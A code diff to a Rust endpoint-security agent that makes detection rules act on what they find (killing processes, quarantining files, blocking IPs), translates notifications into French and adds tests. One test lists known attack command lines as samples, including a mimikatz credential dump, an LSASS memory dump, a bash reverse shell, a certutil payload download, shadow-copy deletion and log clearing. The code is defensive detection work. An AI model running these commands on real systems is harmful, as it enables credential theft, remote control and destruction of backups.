@@ -25,6 +25,37 @@ pub struct RuleMatch {
     pub matched_value: String,
     pub confidence: f32,
     pub ai_classification: Option<String>,
+    /// What the condition found, for the rule's actions to act on.
+    pub targets: Vec<RuleTarget>,
+    pub matched_at: chrono::DateTime<chrono::Utc>,
+}
+
+/// Something a rule condition found on the host.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum RuleTarget {
+    Process {
+        name: String,
+        pid: u32,
+    },
+    Connection {
+        remote_ip: String,
+        port: u16,
+    },
+    /// A file that changed; `removed`: it no longer exists.
+    File {
+        path: String,
+        removed: bool,
+    },
+}
+
+impl RuleTarget {
+    fn file(alert: &FimAlertInfo) -> Self {
+        let change = alert.change_type.to_lowercase();
+        Self::File {
+            path: alert.path.clone(),
+            removed: change.contains("delet") || change.contains("remov"),
+        }
+    }
 }
 
 /// A connection with a remote peer, observed on the host.
@@ -126,18 +157,20 @@ impl RuleHitMemory {
 }
 
 /// What a rule condition found in the observed activity and has not reported
-/// yet: a description of the first observation and the number of others.
+/// yet: a description of the first observation and the number of others,
+/// and every observation, for the rule's actions.
 fn observed_match(
     rule_id: &str,
     condition: &agent_gui::dto::DetectionCondition,
     observed: &ObservedActivity,
     memory: &mut RuleHitMemory,
     now: std::time::Instant,
-) -> Option<String> {
+) -> Option<(String, Vec<RuleTarget>)> {
     use agent_gui::dto::DetectionConditionType as Kind;
 
     let needle = condition.value.to_lowercase();
     let mut new_hits: Vec<String> = Vec::new();
+    let mut targets: Vec<RuleTarget> = Vec::new();
     match condition.condition_type {
         Kind::ProcessNameContains | Kind::CommandLineContains => {
             let by_name = condition.condition_type == Kind::ProcessNameContains;
@@ -157,12 +190,18 @@ fn observed_match(
                 );
                 if memory.report(key, now) {
                     new_hits.push(if by_name {
-                        format!("Process: {} (PID {})", process.name, process.pid)
+                        format!("Processus {} (PID {})", process.name, process.pid)
                     } else {
                         format!(
-                            "Command line match in process {} (PID {})",
-                            process.name, process.pid
+                            "Processus {} (PID {}) : {}",
+                            process.name,
+                            process.pid,
+                            excerpt(&process.command_line)
                         )
+                    });
+                    targets.push(RuleTarget::Process {
+                        name: process.name.clone(),
+                        pid: process.pid,
                     });
                 }
             }
@@ -177,9 +216,16 @@ fn observed_match(
                 if memory.report(key, now) {
                     new_hits.push(match &connection.process_name {
                         Some(process) if !process.trim().is_empty() => {
-                            format!("Connection to {}:{port} by {process}", connection.remote_ip)
+                            format!(
+                                "Connexion vers {}:{port} par {process}",
+                                connection.remote_ip
+                            )
                         }
-                        _ => format!("Connection to {}:{port}", connection.remote_ip),
+                        _ => format!("Connexion vers {}:{port}", connection.remote_ip),
+                    });
+                    targets.push(RuleTarget::Connection {
+                        remote_ip: connection.remote_ip.clone(),
+                        port,
                     });
                 }
             }
@@ -191,11 +237,41 @@ fn observed_match(
 
     let others = new_hits.len().saturating_sub(1);
     let first = new_hits.into_iter().next()?;
-    Some(if others > 0 {
-        format!("{first} (+{others} more)")
+    let described = if others > 0 {
+        format!(
+            "{first} (+{others} autre{})",
+            if others > 1 { "s" } else { "" }
+        )
     } else {
         first
-    })
+    };
+    Some((described, targets))
+}
+
+/// The start of a command line, short enough for a notification.
+fn excerpt(command_line: &str) -> String {
+    const MAX_CHARS: usize = 160;
+    let command_line = command_line.trim();
+    if command_line.chars().count() <= MAX_CHARS {
+        command_line.to_string()
+    } else {
+        let start: String = command_line.chars().take(MAX_CHARS).collect();
+        format!("{start}\u{2026}")
+    }
+}
+
+/// The peer of a network alert, when it names one.
+fn network_alert_target(alert: &NetworkAlertInfo) -> Vec<RuleTarget> {
+    alert
+        .remote_ip
+        .as_ref()
+        .filter(|ip| !ip.trim().is_empty())
+        .map(|ip| RuleTarget::Connection {
+            remote_ip: ip.clone(),
+            port: alert.port.unwrap_or(0),
+        })
+        .into_iter()
+        .collect()
 }
 
 /// Evaluate all enabled detection rules against the current threat context
@@ -227,32 +303,54 @@ pub fn evaluate_detection_rules(
             if condition.value.trim().is_empty() {
                 continue;
             }
-            let matched = match condition.condition_type {
+            let needle = condition.value.to_lowercase();
+            let matched: Option<(String, Vec<RuleTarget>)> = match condition.condition_type {
                 DetectionConditionType::ProcessNameContains => context
                     .suspicious_processes
                     .iter()
-                    .find(|p| {
-                        p.name
-                            .to_lowercase()
-                            .contains(&condition.value.to_lowercase())
-                    })
-                    .map(|p| format!("Process: {} (PID {})", p.name, p.pid)),
+                    .find(|p| p.name.to_lowercase().contains(&needle))
+                    .map(|p| {
+                        (
+                            format!("Processus {} (PID {})", p.name, p.pid),
+                            vec![RuleTarget::Process {
+                                name: p.name.clone(),
+                                pid: p.pid,
+                            }],
+                        )
+                    }),
                 DetectionConditionType::CommandLineContains => context
                     .suspicious_processes
                     .iter()
-                    .find(|p| {
-                        p.command_line
-                            .to_lowercase()
-                            .contains(&condition.value.to_lowercase())
-                    })
-                    .map(|p| format!("Command line match in process {} (PID {})", p.name, p.pid)),
+                    .find(|p| p.command_line.to_lowercase().contains(&needle))
+                    .map(|p| {
+                        (
+                            format!(
+                                "Processus {} (PID {}) : {}",
+                                p.name,
+                                p.pid,
+                                excerpt(&p.command_line)
+                            ),
+                            vec![RuleTarget::Process {
+                                name: p.name.clone(),
+                                pid: p.pid,
+                            }],
+                        )
+                    }),
                 DetectionConditionType::NetworkPort => {
-                    if let Ok(port) = condition.value.parse::<u16>() {
+                    if let Ok(port) = condition.value.trim().parse::<u16>() {
                         context
                             .network_alerts
                             .iter()
                             .find(|a| a.port == Some(port))
-                            .map(|a| format!("Network alert on port {}: {}", port, a.description))
+                            .map(|a| {
+                                (
+                                    format!(
+                                        "Alerte réseau sur le port {} : {}",
+                                        port, a.description
+                                    ),
+                                    network_alert_target(a),
+                                )
+                            })
                     } else {
                         None
                     }
@@ -260,12 +358,13 @@ pub fn evaluate_detection_rules(
                 DetectionConditionType::FimPathMatch => context
                     .fim_alerts
                     .iter()
-                    .find(|f| {
-                        f.path
-                            .to_lowercase()
-                            .contains(&condition.value.to_lowercase())
-                    })
-                    .map(|f| format!("FIM: {} ({})", f.path, f.change_type)),
+                    .find(|f| f.path.to_lowercase().contains(&needle))
+                    .map(|f| {
+                        (
+                            format!("Fichier {} ({})", f.path, f.change_type),
+                            vec![RuleTarget::file(f)],
+                        )
+                    }),
                 DetectionConditionType::SeverityLevel => {
                     // Match if any alert has severity >= threshold
                     let Some(threshold) = severity_to_level(&condition.value) else {
@@ -277,7 +376,15 @@ pub fn evaluate_detection_rules(
                         .find(|a| {
                             severity_to_level(&a.severity).is_some_and(|level| level >= threshold)
                         })
-                        .map(|a| format!("Severity {} >= {}", a.severity, condition.value))
+                        .map(|a| {
+                            (
+                                format!(
+                                    "Sévérité {} >= {} : {}",
+                                    a.severity, condition.value, a.description
+                                ),
+                                network_alert_target(a),
+                            )
+                        })
                 }
             };
 
@@ -285,7 +392,7 @@ pub fn evaluate_detection_rules(
             // and not reported a second time as a plain observation.
             let observed_hit = observed_match(&rule.id, condition, observed, memory, now);
 
-            if let Some(matched_value) = matched.or(observed_hit) {
+            if let Some((matched_value, targets)) = matched.or(observed_hit) {
                 matches.push(RuleMatch {
                     rule_id: rule.id.to_string(),
                     rule_name: rule.name.clone(),
@@ -293,6 +400,8 @@ pub fn evaluate_detection_rules(
                     matched_value,
                     confidence: 0.7, // Deterministic rule confidence; AI is advisory.
                     ai_classification: None,
+                    targets,
+                    matched_at: chrono::Utc::now(),
                 });
             }
         }
@@ -499,37 +608,183 @@ pub async fn run_threat_pipeline(
         }
     }
 
-    // Step 4: Emit rule match notifications
+    // Step 4: the responses chosen on each rule that matched, then the
+    // notification of the match, which says what they did.
     for rule_match in &matches {
+        let rule = rules.iter().find(|rule| rule.id == rule_match.rule_id);
+        let actions = rule
+            .map(|rule| resolve_rule_actions(rule, rule_match))
+            .unwrap_or_default();
+        let label = format!("Règle « {} »", rule_match.rule_name);
+        let actions = if simulate_playbooks {
+            actions
+        } else {
+            // An address blocked again within a day is blocked longer.
+            crate::playbook_engine::escalate_repeated_blocks(&actions)
+        };
+        let results = if actions.is_empty() {
+            Vec::new()
+        } else if simulate_playbooks {
+            crate::playbook_engine::simulate_playbook_actions(&label, &actions, audit_trail).await
+        } else {
+            crate::playbook_engine::execute_playbook_actions_with_delivery(
+                &label,
+                &actions,
+                audit_trail,
+                gui_tx.as_ref(),
+                siem,
+            )
+            .await
+        };
+        if !results.is_empty() {
+            info!(
+                "{}: {} of {} response action(s) {}",
+                label,
+                results.iter().filter(|r| r.success).count(),
+                results.len(),
+                if simulate_playbooks {
+                    "simulated"
+                } else {
+                    "succeeded"
+                }
+            );
+        }
+
         if let Some(tx) = gui_tx {
             let notification = agent_gui::dto::GuiNotification {
                 id: uuid::Uuid::new_v4(),
-                title: format!("Regle '{}' declenchee", rule_match.rule_name),
-                body: format!(
-                    "{}\nConfiance: {:.0}%{}",
-                    rule_match.matched_value,
-                    rule_match.confidence * 100.0,
-                    rule_match
-                        .ai_classification
-                        .as_ref()
-                        .map(|c| format!("\nClassification IA: {}", c))
-                        .unwrap_or_default()
-                ),
+                title: format!("Règle « {} » déclenchée", rule_match.rule_name),
+                body: rule_notification_body(rule_match, &actions, &results, simulate_playbooks),
                 severity: rule_match.severity.clone(),
-                timestamp: chrono::Utc::now(),
+                timestamp: rule_match.matched_at,
                 read: false,
                 action: None,
             };
-
             if let Err(e) = tx.send(agent_gui::events::AgentEvent::Notification { notification }) {
                 warn!("Failed to send detection rule notification: {}", e);
             }
+            let _ = tx.send(agent_gui::events::AgentEvent::DetectionRuleMatched {
+                rule_id: rule_match.rule_id.clone(),
+                matched_at: rule_match.matched_at,
+            });
         }
     }
 
     PipelineResult {
         rule_matches: matches,
         playbook_logs,
+    }
+}
+
+/// The responses a rule asks for, applied to what its condition found: the
+/// processes are stopped, the files put in quarantine, the remote addresses
+/// blocked. A response with nothing to act on is left out (a quarantine for
+/// a connection, a file that was removed). Locking an account and running a
+/// response command need a parameter a rule does not have: playbooks do
+/// that. Every match is notified anyway: the notification is not an action.
+pub fn resolve_rule_actions(
+    rule: &agent_gui::dto::DetectionRule,
+    rule_match: &RuleMatch,
+) -> Vec<crate::playbook_engine::ResolvedAction> {
+    use crate::playbook_engine::{DEFAULT_BLOCK_SECS, ResolvedAction, isolation_duration};
+    use agent_gui::dto::PlaybookActionType as Action;
+
+    let mut resolved: Vec<ResolvedAction> = Vec::new();
+    let mut push = |action: ResolvedAction| {
+        if !resolved.contains(&action) {
+            resolved.push(action);
+        }
+    };
+    for action in &rule.actions {
+        match action {
+            Action::KillProcess => {
+                for target in &rule_match.targets {
+                    if let RuleTarget::Process { name, pid } = target {
+                        push(ResolvedAction::KillProcess {
+                            name: name.clone(),
+                            pid: *pid,
+                        });
+                    }
+                }
+            }
+            Action::QuarantineFile => {
+                for target in &rule_match.targets {
+                    if let RuleTarget::File {
+                        path,
+                        removed: false,
+                    } = target
+                    {
+                        push(ResolvedAction::QuarantineFile { path: path.clone() });
+                    }
+                }
+            }
+            Action::BlockIp => {
+                for target in &rule_match.targets {
+                    if let RuleTarget::Connection { remote_ip, .. } = target {
+                        push(ResolvedAction::BlockIp {
+                            ip: remote_ip.clone(),
+                            duration_secs: DEFAULT_BLOCK_SECS,
+                        });
+                    }
+                }
+            }
+            Action::IsolateHost => push(ResolvedAction::IsolateHost {
+                duration_secs: isolation_duration(""),
+            }),
+            Action::SendSiemAlert => push(ResolvedAction::Alert {
+                title: format!("Règle « {} » déclenchée", rule.name),
+                severity: rule.severity.as_str().to_string(),
+                description: rule_match.matched_value.clone(),
+            }),
+            Action::CreateNotification | Action::DisableAccount | Action::RunCommand => {}
+        }
+    }
+    resolved
+}
+
+/// What a rule found, its AI reading when there is one, and what its
+/// responses did (`results` holds one result per action, in order).
+fn rule_notification_body(
+    rule_match: &RuleMatch,
+    actions: &[crate::playbook_engine::ResolvedAction],
+    results: &[crate::playbook_engine::ActionResult],
+    simulated: bool,
+) -> String {
+    let mut body = rule_match.matched_value.clone();
+    if let Some(classification) = &rule_match.ai_classification {
+        body.push_str(&format!("\nAnalyse IA : {classification}"));
+    }
+    for (action, result) in actions.iter().zip(results) {
+        let what = response_label(action);
+        body.push_str(&match &result.error {
+            None if simulated => format!("\nSimulation, rien n'a été fait : {what}"),
+            None => format!("\nRéponse : {what}"),
+            Some(error) => format!("\nRéponse en échec : {what} ({error})"),
+        });
+    }
+    body
+}
+
+/// A rule's response, as the notification says it.
+fn response_label(action: &crate::playbook_engine::ResolvedAction) -> String {
+    use crate::playbook_engine::ResolvedAction;
+    match action {
+        ResolvedAction::KillProcess { name, pid } => {
+            format!("arrêt du processus {name} (PID {pid})")
+        }
+        ResolvedAction::QuarantineFile { path } => format!("mise en quarantaine de {path}"),
+        ResolvedAction::BlockIp { ip, duration_secs } => match duration_secs {
+            0 => format!("blocage de {ip} jusqu'au déblocage"),
+            secs => format!(
+                "blocage de {ip} pendant {}",
+                agent_gui::format::duration_short(*secs)
+            ),
+        },
+        ResolvedAction::IsolateHost { .. } => "isolement du poste".to_string(),
+        ResolvedAction::Alert { .. } => "alerte envoyée au SIEM".to_string(),
+        ResolvedAction::Notify { .. } => "notification".to_string(),
+        ResolvedAction::DisableAccount { user, .. } => format!("verrouillage du compte {user}"),
+        ResolvedAction::RunCommand { name, .. } => format!("commande de réponse {name}"),
     }
 }
 
@@ -573,6 +828,27 @@ pub fn stored_rule_to_single_dto(
             .and_then(|v| chrono::DateTime::parse_from_rfc3339(v).ok())
             .map(|dt| dt.with_timezone(&chrono::Utc)),
         match_count: s.match_count.max(0) as u32,
+    }
+}
+
+/// A detection rule as the database stores it; `synced`: the platform has
+/// this version.
+pub fn rule_to_stored(
+    rule: &agent_gui::dto::DetectionRule,
+    synced: bool,
+) -> agent_storage::repositories::grc::StoredDetectionRule {
+    agent_storage::repositories::grc::StoredDetectionRule {
+        id: rule.id.clone(),
+        name: rule.name.clone(),
+        description: rule.description.clone(),
+        severity: rule.severity.as_str().to_string(),
+        conditions: serde_json::to_string(&rule.conditions).unwrap_or_else(|_| "[]".into()),
+        actions: serde_json::to_string(&rule.actions).unwrap_or_else(|_| "[]".into()),
+        enabled: rule.enabled,
+        created_at: rule.created_at.to_rfc3339(),
+        last_match: rule.last_match.map(|d| d.to_rfc3339()),
+        match_count: rule.match_count.min(i32::MAX as u32) as i32,
+        synced,
     }
 }
 
@@ -1106,7 +1382,14 @@ mod tests {
             &mut memory,
         );
         assert_eq!(matches.len(), 1);
-        assert_eq!(matches[0].matched_value, "Process: AnyDesk (PID 4312)");
+        assert_eq!(matches[0].matched_value, "Processus AnyDesk (PID 4312)");
+        assert_eq!(
+            matches[0].targets,
+            vec![RuleTarget::Process {
+                name: "AnyDesk".into(),
+                pid: 4312
+            }]
+        );
         // The process is still running at the next scan: not reported again.
         assert!(
             evaluate_detection_rules(&[by_name], &nothing_flagged, &observed, &mut memory)
@@ -1123,7 +1406,7 @@ mod tests {
         );
         assert_eq!(
             matches[0].matched_value,
-            "Command line match in process AnyDesk (PID 4312)"
+            "Processus AnyDesk (PID 4312) : /Applications/AnyDesk.app/AnyDesk --service"
         );
     }
 
@@ -1149,8 +1432,10 @@ mod tests {
         assert_eq!(matches.len(), 1);
         assert_eq!(
             matches[0].matched_value,
-            "Process: helper (PID 10) (+2 more)"
+            "Processus helper (PID 10) (+2 autres)"
         );
+        // Every new instance is a target of the rule's actions.
+        assert_eq!(matches[0].targets.len(), 3);
 
         // A new instance appears among the known ones: it alone is reported.
         let observed = ObservedActivity {
@@ -1159,7 +1444,7 @@ mod tests {
         };
         let matches =
             evaluate_detection_rules(&[rule], &ThreatContext::default(), &observed, &mut memory);
-        assert_eq!(matches[0].matched_value, "Process: helper (PID 13)");
+        assert_eq!(matches[0].matched_value, "Processus helper (PID 13)");
     }
 
     #[test]
@@ -1191,7 +1476,7 @@ mod tests {
         assert_eq!(matches.len(), 1);
         assert_eq!(
             matches[0].matched_value,
-            "Connection to 203.0.113.7:3389 by mstsc"
+            "Connexion vers 203.0.113.7:3389 par mstsc"
         );
         assert!(
             evaluate_detection_rules(&[rule], &ThreatContext::default(), &observed, &mut memory)
@@ -1276,6 +1561,296 @@ mod tests {
         // The most recent observations are the ones kept.
         let last = format!("key-{}", RuleHitMemory::CAPACITY + 9);
         assert!(memory.reported.contains_key(&last));
+    }
+
+    fn rule_match(targets: Vec<RuleTarget>) -> RuleMatch {
+        RuleMatch {
+            rule_id: "rule-1".into(),
+            rule_name: "test".into(),
+            severity: "high".into(),
+            matched_value: "Processus nc (PID 77)".into(),
+            confidence: 0.7,
+            ai_classification: None,
+            targets,
+            matched_at: chrono::Utc::now(),
+        }
+    }
+
+    #[test]
+    fn a_rule_acts_on_what_its_condition_found() {
+        use crate::playbook_engine::ResolvedAction;
+        use agent_gui::dto::{DetectionConditionType as Kind, PlaybookActionType as Action};
+        let mut rule = rule_with(Kind::ProcessNameContains, "nc");
+        rule.actions = vec![
+            Action::KillProcess,
+            Action::QuarantineFile,
+            Action::BlockIp,
+            Action::CreateNotification,
+            Action::DisableAccount,
+            Action::RunCommand,
+        ];
+        let found = rule_match(vec![
+            RuleTarget::Process {
+                name: "nc".into(),
+                pid: 77,
+            },
+            RuleTarget::Process {
+                name: "nc".into(),
+                pid: 78,
+            },
+            RuleTarget::Connection {
+                remote_ip: "203.0.113.7".into(),
+                port: 4444,
+            },
+            RuleTarget::File {
+                path: "/tmp/payload".into(),
+                removed: false,
+            },
+            RuleTarget::File {
+                path: "/tmp/gone".into(),
+                removed: true,
+            },
+        ]);
+        assert_eq!(
+            resolve_rule_actions(&rule, &found),
+            vec![
+                ResolvedAction::KillProcess {
+                    name: "nc".into(),
+                    pid: 77
+                },
+                ResolvedAction::KillProcess {
+                    name: "nc".into(),
+                    pid: 78
+                },
+                // A file that no longer exists cannot be put in quarantine.
+                ResolvedAction::QuarantineFile {
+                    path: "/tmp/payload".into()
+                },
+                ResolvedAction::BlockIp {
+                    ip: "203.0.113.7".into(),
+                    duration_secs: crate::playbook_engine::DEFAULT_BLOCK_SECS
+                },
+            ]
+        );
+    }
+
+    #[test]
+    fn a_rule_without_a_target_for_its_action_does_nothing() {
+        use agent_gui::dto::{DetectionConditionType as Kind, PlaybookActionType as Action};
+        let mut rule = rule_with(Kind::NetworkPort, "4444");
+        rule.actions = vec![Action::KillProcess, Action::QuarantineFile];
+        let found = rule_match(vec![RuleTarget::Connection {
+            remote_ip: "203.0.113.7".into(),
+            port: 4444,
+        }]);
+        assert!(resolve_rule_actions(&rule, &found).is_empty());
+        rule.actions = vec![];
+        assert!(resolve_rule_actions(&rule, &found).is_empty());
+    }
+
+    #[test]
+    fn host_wide_responses_do_not_need_a_target() {
+        use crate::playbook_engine::ResolvedAction;
+        use agent_gui::dto::{DetectionConditionType as Kind, PlaybookActionType as Action};
+        let mut rule = rule_with(Kind::ProcessNameContains, "nc");
+        rule.actions = vec![Action::IsolateHost, Action::SendSiemAlert];
+        let actions = resolve_rule_actions(&rule, &rule_match(vec![]));
+        assert_eq!(actions.len(), 2);
+        assert!(matches!(actions[0], ResolvedAction::IsolateHost { .. }));
+        assert!(matches!(
+            &actions[1],
+            ResolvedAction::Alert { title, .. } if title == "Règle « test » déclenchée"
+        ));
+    }
+
+    #[test]
+    fn the_notification_says_what_the_responses_did() {
+        use crate::playbook_engine::{ActionResult, ResolvedAction};
+        let actions = vec![
+            ResolvedAction::KillProcess {
+                name: "nc".into(),
+                pid: 77,
+            },
+            ResolvedAction::BlockIp {
+                ip: "203.0.113.7".into(),
+                duration_secs: 3600,
+            },
+        ];
+        let results = vec![
+            ActionResult {
+                action: "Kill process nc (PID 77)".into(),
+                success: true,
+                error: None,
+            },
+            ActionResult {
+                action: "Block IP 203.0.113.7".into(),
+                success: false,
+                error: Some("denied".into()),
+            },
+        ];
+        let body = rule_notification_body(&rule_match(vec![]), &actions, &results, false);
+        assert!(body.starts_with("Processus nc (PID 77)"), "{body}");
+        assert!(
+            body.contains("Réponse : arrêt du processus nc (PID 77)"),
+            "{body}"
+        );
+        assert!(
+            body.contains("Réponse en échec : blocage de 203.0.113.7 pendant 1"),
+            "{body}"
+        );
+        assert!(body.contains("(denied)"), "{body}");
+
+        let simulated =
+            rule_notification_body(&rule_match(vec![]), &actions[..1], &results[..1], true);
+        assert!(
+            simulated.contains("Simulation, rien n'a été fait"),
+            "{simulated}"
+        );
+    }
+
+    #[test]
+    fn shipped_rules_catch_known_attacks_and_leave_ordinary_activity_alone() {
+        let rules = agent_gui::detection_catalog::default_rules(chrono::Utc::now());
+        let attacks = [
+            process(
+                "mimikatz.exe",
+                100,
+                "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
+            ),
+            process(
+                "rundll32.exe",
+                101,
+                r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full",
+            ),
+            process("bash", 102, "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"),
+            process("xmrig", 103, "./xmrig -o stratum+tcp://pool.example:3333"),
+            process(
+                "vssadmin.exe",
+                104,
+                "vssadmin.exe Delete Shadows /All /Quiet",
+            ),
+            process(
+                "powershell.exe",
+                105,
+                "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA",
+            ),
+            process(
+                "osascript",
+                106,
+                r#"osascript -e display dialog "Mot de passe" default answer "" with hidden answer"#,
+            ),
+            process(
+                "certutil.exe",
+                107,
+                "certutil.exe -urlcache -split -f http://203.0.113.7/p.exe p.exe",
+            ),
+            process("wevtutil.exe", 108, "wevtutil.exe cl Security"),
+        ];
+        let ordinary = [
+            process(
+                "Safari",
+                200,
+                "/Applications/Safari.app/Contents/MacOS/Safari",
+            ),
+            process(
+                "sshd",
+                201,
+                "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups",
+            ),
+            process("systemd", 202, "/sbin/init splash"),
+            process(
+                "powershell.exe",
+                203,
+                "powershell.exe -NoProfile -File C:\\scripts\\inventaire.ps1",
+            ),
+            process(
+                "code",
+                204,
+                "/usr/share/code/code --type=renderer --enable-crash-reporter",
+            ),
+            process(
+                "chrome",
+                205,
+                "chrome --type=utility --utility-sub-type=network.mojom.NetworkService",
+            ),
+            process("lsass.exe", 206, r"C:\Windows\system32\lsass.exe"),
+            process(
+                "svchost.exe",
+                207,
+                r"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule",
+            ),
+        ];
+
+        for attack in &attacks {
+            let observed = ObservedActivity {
+                processes: vec![attack.clone()],
+                connections: vec![],
+            };
+            let matches = evaluate_detection_rules(
+                &rules,
+                &ThreatContext::default(),
+                &observed,
+                &mut RuleHitMemory::default(),
+            );
+            assert!(!matches.is_empty(), "missed: {}", attack.command_line);
+        }
+
+        let observed = ObservedActivity {
+            processes: ordinary.to_vec(),
+            connections: vec![ObservedConnection {
+                remote_ip: "198.51.100.10".into(),
+                port: 443,
+                process_name: Some("chrome".into()),
+            }],
+        };
+        let matches = evaluate_detection_rules(
+            &rules,
+            &ThreatContext::default(),
+            &observed,
+            &mut RuleHitMemory::default(),
+        );
+        assert!(
+            matches.is_empty(),
+            "false positives: {:?}",
+            matches
+                .iter()
+                .map(|m| format!("{} <- {}", m.rule_name, m.matched_value))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn shipped_file_rules_catch_changes_to_authentication_and_startup_files() {
+        let rules = agent_gui::detection_catalog::default_rules(chrono::Utc::now());
+        for path in [
+            "/etc/sudoers",
+            "/root/.ssh/authorized_keys",
+            "/etc/ld.so.preload",
+            "/Library/LaunchDaemons/com.example.plist",
+            r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk",
+            r"C:\Windows\System32\drivers\etc\hosts",
+        ] {
+            let context = ThreatContext {
+                fim_alerts: vec![FimAlertInfo {
+                    path: path.into(),
+                    change_type: "modified".into(),
+                }],
+                ..Default::default()
+            };
+            let matches = evaluate_detection_rules(
+                &rules,
+                &context,
+                &ObservedActivity::default(),
+                &mut RuleHitMemory::default(),
+            );
+            assert!(!matches.is_empty(), "missed: {path}");
+            assert!(
+                matches[0]
+                    .targets
+                    .iter()
+                    .all(|t| matches!(t, RuleTarget::File { .. }))
+            );
+        }
     }
 
     #[test]
